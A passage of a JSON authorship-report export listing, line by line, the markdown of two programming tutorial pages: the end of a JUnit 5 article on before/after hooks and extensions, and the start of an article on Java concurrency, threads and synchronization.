        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": "This expression is a lot easier to understand, and as an added bonus, the code is also much shorter to write!"
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": "### Before/After hooks"
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": "Not every system can be tested so easily. Sometimes, testing is not as straightforward as running a function."
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": "For example, we might want to store information in a database. We would have to first connect to the database before we can run any test."
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": "JUnit exposes an API that allows developers to do this process easily and clearly. The `@BeforeAll` tag allows us to run code once before all tests. Using `@BeforeAll`, we can easily initialize our testing environment:"
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": "class TestInvolvingDatabases {"
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": "  Database db;"
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": "  @BeforeAll"
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": "  public static void initializeDatabaseConnection() {"
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": "    // Initialize database connections"
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": "    db \u003d connectToDatabase();"
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": "  @Test"
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": "  public static void addUserTest() {"
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "-"
        },
        "content": "    db.addUser(\u0027NewUser\u0027);"
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "-"
        },
        "content": "    ..."
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "-"
        },
        "content": "JUnit also offers a `@BeforeEach` tag to run code before every test. One use case is to ensure that we standardise the testing environment before each test."
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "-"
        },
        "content": "For example, we can clear our database before each test to ensure that tests do not \u003ctrigger for\u003d\"modal:affectEachOther\" trigger\u003d\"click\"\u003eaffect each other\u003c/trigger\u003e."
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "-"
        },
        "content": "class TestInvolvingDatabase {"
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "-"
        },
        "content": "  Database db;"
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "-"
        },
        "content": "  @BeforeEach"
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "-"
        },
        "content": "  public static void resetDatabaseTable() {"
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "-"
        },
        "content": "    db.truncate(\"testTable\");"
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "-"
        },
        "content": "Similarly, we can use the `@AfterAll` and `@AfterEach` tags to run code after all tests, and after each test respectively:"
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "-"
        },
        "content": "class TestInvolvingDatabases {"
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "-"
        },
        "content": "  Database db;"
      },
      {
        "lineNumber": 199,
        "author": {
          "gitId": "-"
        },
        "content": "  DatabaseSnapshot snapshot;"
      },
      {
        "lineNumber": 200,
        "author": {
          "gitId": "-"
        },
        "content": "  @AfterEach"
      },
      {
        "lineNumber": 201,
        "author": {
          "gitId": "-"
        },
        "content": "  public static void restoreDatabaseTable() {"
      },
      {
        "lineNumber": 202,
        "author": {
          "gitId": "-"
        },
        "content": "    db.restore(snapshot); // Restore previous state of database"
      },
      {
        "lineNumber": 203,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 204,
        "author": {
          "gitId": "-"
        },
        "content": "  @AfterAll"
      },
      {
        "lineNumber": 205,
        "author": {
          "gitId": "-"
        },
        "content": "  public static void closeDatabaseConnection() {"
      },
      {
        "lineNumber": 206,
        "author": {
          "gitId": "-"
        },
        "content": "    db.close(); // Explicitly close DB connection instead of timing out."
      },
      {
        "lineNumber": 207,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 208,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 209,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 210,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 211,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 212,
        "author": {
          "gitId": "-"
        },
        "content": "### Extension Model"
      },
      {
        "lineNumber": 213,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 214,
        "author": {
          "gitId": "-"
        },
        "content": "Consider a project where tests need to:"
      },
      {
        "lineNumber": 215,
        "author": {
          "gitId": "-"
        },
        "content": "* connect to the database before all tests"
      },
      {
        "lineNumber": 216,
        "author": {
          "gitId": "-"
        },
        "content": "* clear a database before each test to ensure consistency"
      },
      {
        "lineNumber": 217,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 218,
        "author": {
          "gitId": "-"
        },
        "content": "One way would be to write helper methods `initializeDatabaseConnection()` and `resetDatabaseTable()` and invoke them as required, in the `@BeforeAll`/`@BeforeEach` methods."
      },
      {
        "lineNumber": 219,
        "author": {
          "gitId": "-"
        },
        "content": "However, this is prone to errors - if we do not explicitly call these methods, the database is not initialised or reset."
      },
      {
        "lineNumber": 220,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 221,
        "author": {
          "gitId": "-"
        },
        "content": "In JUnit, the extension model allows us to augment the test class. Instead of needing to invoke helper methods when we need them, we can introduce a `ManagedDatabase` extension that can automatically connect to a remote database and reset itself before each test."
      },
      {
        "lineNumber": 222,
        "author": {
          "gitId": "-"
        },
        "content": "This abstracts away the need to manage the database, allowing us to focus on testing our logic."
      },
      {
        "lineNumber": 223,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 224,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 225,
        "author": {
          "gitId": "-"
        },
        "content": "class ManagedDatabase implements BeforeAllCallback, BeforeEachCallback {"
      },
      {
        "lineNumber": 226,
        "author": {
          "gitId": "-"
        },
        "content": "  Database db;"
      },
      {
        "lineNumber": 227,
        "author": {
          "gitId": "-"
        },
        "content": "  String url;"
      },
      {
        "lineNumber": 228,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 229,
        "author": {
          "gitId": "-"
        },
        "content": "  public ManagedDatabase(String url) {"
      },
      {
        "lineNumber": 230,
        "author": {
          "gitId": "-"
        },
        "content": "      this.url \u003d url;"
      },
      {
        "lineNumber": 231,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 232,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 233,
        "author": {
          "gitId": "-"
        },
        "content": "  @Override"
      },
      {
        "lineNumber": 234,
        "author": {
          "gitId": "-"
        },
        "content": "  public void beforeAll(ExtensionContext context) throws Exception {"
      },
      {
        "lineNumber": 235,
        "author": {
          "gitId": "-"
        },
        "content": "      db \u003d connectToDB(url);"
      },
      {
        "lineNumber": 236,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 237,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 238,
        "author": {
          "gitId": "-"
        },
        "content": "  @Override"
      },
      {
        "lineNumber": 239,
        "author": {
          "gitId": "-"
        },
        "content": "  public void beforeEach(ExtensionContext context) throws Exception {"
      },
      {
        "lineNumber": 240,
        "author": {
          "gitId": "-"
        },
        "content": "      db.truncate(\"testTable\");"
      },
      {
        "lineNumber": 241,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 242,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 243,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 244,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 245,
        "author": {
          "gitId": "-"
        },
        "content": "Now, any code requiring a database can simply do the following to initialize a database connection that resets itself before every test:"
      },
      {
        "lineNumber": 246,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 247,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 248,
        "author": {
          "gitId": "-"
        },
        "content": "public class LogicTest {"
      },
      {
        "lineNumber": 249,
        "author": {
          "gitId": "-"
        },
        "content": "  @RegisterExtension"
      },
      {
        "lineNumber": 250,
        "author": {
          "gitId": "-"
        },
        "content": "  public ManagedDatabase db \u003d new ManagedDatabase(\"localhost\");"
      },
      {
        "lineNumber": 251,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 252,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 253,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 254,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cp\u003e\u003c/p\u003e "
      },
      {
        "lineNumber": 255,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 256,
        "author": {
          "gitId": "-"
        },
        "content": "## Getting Started"
      },
      {
        "lineNumber": 257,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 258,
        "author": {
          "gitId": "-"
        },
        "content": "If this introduction has got you interested in using JUnit, do check out the following resources for an introduction to using JUnit:"
      },
      {
        "lineNumber": 259,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 260,
        "author": {
          "gitId": "-"
        },
        "content": "* Introductory JUnit guide: [JUnit 5 Tutorial](https://howtodoinjava.com/junit-5-tutorial/)"
      },
      {
        "lineNumber": 261,
        "author": {
          "gitId": "-"
        },
        "content": "* Comprehensive JUnit guide: [A Guide to JUnit 5](https://www.baeldung.com/junit-5)"
      },
      {
        "lineNumber": 262,
        "author": {
          "gitId": "-"
        },
        "content": "* Extensions and Lifecycle of Tests: [Deep Dive into JUnit 5 Extension Model](https://www.infoq.com/articles/deep-dive-junit5-extensions)"
      },
      {
        "lineNumber": 263,
        "author": {
          "gitId": "-"
        },
        "content": "* Official User Guide: [JUnit 5 User Guide](https://junit.org/junit5/docs/current/user-guide/)"
      },
      {
        "lineNumber": 264,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 265,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      },
      {
        "lineNumber": 266,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 267,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cmodal id\u003d\"modal:affectEachOther\"\u003e"
      },
      {
        "lineNumber": 268,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003cdiv slot\u003d\"modal-header\" class\u003d\"modal-title text-center\"\u003e"
      },
      {
        "lineNumber": 269,
        "author": {
          "gitId": "-"
        },
        "content": "    \u003ch4\u003eHow will tests affect each other?\u003c/h4\u003e"
      },
      {
        "lineNumber": 270,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003c/div\u003e"
      },
      {
        "lineNumber": 271,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003cp\u003eIf we do not reset a shared resource (e.g. databse / file), a test that uses the resource permanently changes the resource. As a result, other tests cannot assume anything about the initial state of this resource.\u003c/p\u003e"
      },
      {
        "lineNumber": 272,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003cp\u003eFor example, test A checks for a correctly set-up, empty database. Test B writes to an initially empty database. Without resetting the database, test A can fail if test B manages to runs first.\u003c/p\u003e"
      },
      {
        "lineNumber": 273,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/modal\u003e  "
      },
      {
        "lineNumber": 274,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 275,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "iskandarzulkarnaien": 11,
      "-": 264
    }
  },
  {
    "path": "contents/java/JavaConcurrency.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Java Concurrency"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Java Concurrency"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Authors: Vivek Lakshmanan"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "-"
        },
        "content": "* [What is Java Concurrency](#what-is-java-concurrency)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "-"
        },
        "content": "* [Getting started](#getting-started)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Understanding Threads](#understanding-threads)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Creating and Starting Threads](#creating-and-starting-threads)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Operations on Threads](#operations-on-threads)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Thread Interference](#thread-interference)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Executors](#executors)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "-"
        },
        "content": "* [Disadvantages of Java Concurrency](#disadvantages-of-java-concurrency)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": "* [Resources](#resources)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Further Reading](#further-reading)"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "## What is Java Concurrency"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "_Concurrency_ is the ability to run several programs or several parts of a program **out-of-order**, in an **interleaved fashion**. Simply put, if a program is running concurrently, the processor will execute one part of the program, pause it, execute another part and repeat. "
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": "As such, Java Concurrency enables you to perform tasks using multi-threading in your code and therefore:"
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "1. improving responsiveness"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "1. allowing you to better utilize resources "
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "Do note that _Concurrency_ often gets confused with _Parallelism_ which is **a different property altogether**. _Parallelism_ is where parts of the program are executed at the **same time**, for example, on a multi-core processor. This [StackOverflow post](https://stackoverflow.com/questions/4844637/what-is-the-difference-between-concurrency-parallelism-and-asynchronous-methods/36604522#36604522) explains this in much greater detail."
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "## Getting Started"
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "There are many tutorials that cover Java Concurrency in-depth, such as the [Java tutorial by Oracle](https://docs.oracle.com/javase/tutorial/essential/concurrency/). Instead, this chapter will provide an overview and things to take note of."
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "### Understanding Threads"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "First off, a process is simply a program in execution. It contains at least one thread and has it\u0027s own memory space."
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "A thread: "
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "* is a lightweight process that exists within a process "
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "* is an independent path of execution through program code "
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "* has its own call stack and can access shared data of other threads in the same process. "
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "### Creating and Starting Threads"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "There are two ways to create a thread in Java:"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": " "
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "1. Extend the `Thread` class"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "1. Implement the `Runnable` interface"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "After which, override the `run()` method which contains the code that will be executed when the thread starts. "
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "Depending on how you created the `Thread` you can either create the class that extends the `Thread` class or pass the class that implements the `Runnable` interface into the `Thread` constructor and then start it."
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "When deciding which method to use to create a `Thread`, it is always advisable to implement the `Runnable` interface as this results in composition which will allow your code to be more loosely coupled as compared to inheritance. Furthermore, you can extend another class if need be. Shown below are the two ways to create a `Thread`. "
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "Extending the `Thread` class:"
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "public class AnotherThread extends Thread {"
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "    @Override"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "    public void run() {"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "        System.out.println(\"This class extends the Thread class\");"
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "Implemeting the `Runnable` interface:"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "public class MyRunnable implements Runnable {"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "    @Override"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "    public void run() {"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "        System.out.println(\"This class implements the Runnable interface\");"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "Do note that this is only for illustration and can be simplified using lambdas."
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "### Operations on Threads"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "After creating and starting threads, you can carry out operations on them. There are several such operations you can use to manipulate threads:"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "* Making a thread sleep for a given amount of time. This is useful for pausing the execution of a thread for a certain amount of time to free up resources for other threads or delaying the execution of the thread.  "
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "try {"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "    Thread.sleep(1000);"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "} catch (InterruptedException e){"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "    // handle interruption"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "* Joining one thread to the current thread. This will pause the execution of the current thread and cause it to wait until the newly joined thread has finished it\u0027s execution. This is useful in cases where there is a need for the results of another thread before moving on."
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "try {"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "    thread2.join();"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "} catch (InterruptedException e) {"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "    // handle interruption"
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "### Thread Interference"
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "Since threads share the resources of the process they exist in, there will inevitably be conflicts when using shared resources due to the unpredictable nature of threads. When threads try to write to the same resource, thread interference occurs. To illustrate this problem, here\u0027s a sequence of execution for two threads, A and B, that increment and decrement a counter variable respectively:"
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "1. Thread A retrieves the value of counter and increments it to a value of 1"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "2. Thread B then retrieves the values of counter, which is still 0, and decrements it to a value of -1"
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "3. Thread A stores the value of 1 to the counter variable"
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "4. Thread B stores the value of -1 to the counter variable and overwrites the previous value stored by Thread A"
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "![Thread Interference Sequence](thread_interference.png)"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "Without thread interference, the expected value of the counter variable would be 0, since one thread increments it while the other decrements it. But with thread interference, the value of counter is simply the value written by the last thread. This is due to the unpredictable nature of threads as there is no way to know when the operating system switches between the two threads. "
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "To solve this issue of interference, the keyword `synchronized` is used to ensure that method or block of code can only be accessed by one thread at a time. This is done through the use of the intrinsic lock system, a mechanism put in place by Java to control access to a shared resource. Simply put, each object has it\u0027s own intrinsic lock which:"
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "* is acquired by the thread that works on it"
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": "* prevents any other thread from working on it while it\u0027s lock has been acquired"
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "This can be illustrated by the following image where once Thread 2 (T2) acquires the lock for the synchronized block of code, the other two threads (T1 and T3) must wait for the synchronized block of code to release it\u0027s lock once T2 to complete its execution:"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "![Synchronized block](https://www.javalearningacademy.com/wp-content/uploads/2015/10/Synchronized_Code_Block_And_Thread_Execution.jpg)"
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": "For a deeper look, see the [Java Synchronisation](JavaSynchronization.html) section."
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "### Executors"
      },
